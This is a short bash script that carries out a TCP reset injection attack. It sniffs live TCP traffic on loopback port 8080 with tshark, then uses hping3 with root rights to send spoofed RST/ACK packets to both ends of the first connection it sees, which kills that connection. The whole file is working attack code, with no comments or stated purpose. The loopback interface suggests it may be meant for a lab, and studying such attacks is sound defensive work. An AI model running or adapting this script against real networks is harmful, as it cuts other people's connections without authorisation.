#!/bin/bash

IFACE="lo"
PORT=8080

tshark -i "$IFACE" -l \
-Y "tcp.port==$PORT && tcp.flags.ack==1 && tcp.len>0" \
-T fields \
-e ip.src -e ip.dst \
-e tcp.srcport -e tcp.dstport \
-e tcp.ack |
while read SRC DST SPORT DPORT ACK
do
    sudo /usr/sbin/hping3 "$DST" \
      -R -A \
      -s "$SPORT" \
      -p "$DPORT" \
      -M "$ACK" \
      -c 1

    sudo /usr/sbin/hping3 "$SRC" \
      -R -A \
      -s "$DPORT" \
      -p "$SPORT" \
      -M "$ACK" \
      -c 1

    break
done

